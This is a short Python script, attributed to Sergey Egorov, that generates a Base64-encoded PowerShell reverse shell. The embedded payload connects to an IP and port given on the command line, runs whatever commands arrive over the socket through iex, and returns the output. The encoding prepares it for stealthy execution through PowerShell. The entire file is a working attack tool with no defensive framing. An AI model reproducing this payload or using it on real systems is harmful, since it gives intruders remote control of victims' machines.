##########################
# The script generates the Base64 encoded PS reverse shell
# Author Sergey Egorov
##########################

import sys
import base64

def print_usage():
	print "Usage:"
	print "\tpython %s <local ip> <reverse shell port>" % sys.argv[0]
	print "\tpython %s 192.168.124.139 4444" % sys.argv[0]

if len(sys.argv) != 3:
	print_usage()
	exit()

shell1 = "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);" % (sys.argv[1],sys.argv[2])
shell2 = "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"

shell = shell1 + shell2

print base64.standard_b64encode(shell.encode("utf-16le"))

